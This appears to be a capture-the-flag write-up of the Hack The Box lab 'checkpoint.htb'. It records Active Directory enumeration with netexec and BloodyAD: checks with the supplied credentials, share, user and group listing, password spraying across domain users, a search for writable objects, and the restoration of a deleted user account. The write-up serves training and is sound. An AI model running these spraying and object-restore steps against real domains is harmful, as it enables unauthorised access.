>[!INFO]
> `alex.turner:Checkpoint2024!`

## DNS Config

```sh
# Add to file
echo "$TARGET DC01.checkpoint.htb checkpoint.htb DC01" | sudo tee -a /etc/hosts
# Verify
cat /etc/hosts | grep checkpoint
```

- **`checkpoint.htb`** – the domain name used in LDAP (`DC=checkpoint,DC=htb`).
    
- **`DC01.checkpoint.htb`** – the fully qualified domain name (FQDN) of the Domain Controller, which Kerberos and some tools expect.
    
- **`DC01`** – short hostname, convenient for quick pings or tests.

---
## SMB 

### Verify Inital Credentials
> `(Pwn3d!)` in the output means the user has administrative privileges

```sh
nxc smb  $TARGET -u "alex.turner" -p "Checkpoint2024!"
```

![](<./attachments/2-Enum.png>)

### Shares
> See all available SMB shares and the user's permissions on them
```sh
nxc smb  $TARGET -u "alex.turner" -p "Checkpoint2024!" --shares
```

![](<./attachments/2-Enum-1.png>)

`DevDrop`: VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0

`VMBackups`
### Domain Users 
> List domain users and groups

```sh
nxc smb  $TARGET -u "alex.turner" -p "Checkpoint2024!" --users
```


![](<./attachments/2-Enum-2.png>)

### Domain Groups

```sh
nxc smb  $TARGET -u "alex.turner" -p "Checkpoint2024!" --groups
```

![](<./attachments/2-Enum-3.png>)

### Create User & Password Lists

```sh
mkdir enum
```
#### User List
> `enum/users`

```sh
# Save to user file
nxc smb $TARGET -u "" -p "" --users | awk '$6 ~ /^[0-9]{4}-[0-9]{2}-[0-9]{2}|<never>/ {print $5}' | sort -u | tee users.txt
```


```txt
Administrator
Guest                
krbtgt             
alex.turner                   
ryan.brooks           
svc_deploy 
james.harper  
sarah.mitchell      
emily.carter                  
david.reynolds               
jessica.coleman               
lauren.flores                 
michael.torres      
kevin.patterson    
brian.jenkins      
megan.perry 
max.palmer
```
####  Password List
> `enum/passwords`

```sh
Checkpoint2024!
```

### Password spraying
> test alex.turner’s password against other users
```sh
nxc smb $TARGET -u enum/users -p enum/passwords --continue-on-success
```

![](<./attachments/02-Enumeration.png>)

- No user access with current lists 

## Find Writable Objects

> Using tool: [[BloodyAD]]

```sh
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
```

![](<./attachments/02-Enumeration-1.png>)

- Found user: Mark Davies 

### Restore Deleted Object `Mark Davies`

```sh
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore \
'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

![](<./attachments/02-Enumeration-2.png>)

**Verify password reuse**

```sh
nxc smb $TARGET -u 'Mark.Davies' -p 'Checkpoint2024!'
```

![](<./attachments/02-Enumeration-3.png>)

- Checked 

